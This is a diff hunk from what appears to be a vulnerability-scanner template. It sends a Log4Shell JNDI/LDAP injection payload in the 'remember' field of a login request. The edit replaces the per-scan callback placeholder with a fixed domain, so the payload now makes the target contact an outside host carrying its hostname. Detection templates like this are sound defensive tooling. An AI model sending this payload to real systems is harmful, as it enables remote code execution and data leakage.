@@ -37,7 +37,7 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage
 
-        {"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}
+        {"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.interactsh-url.com}","strict":true}
 
     matchers-condition: and
     matchers:
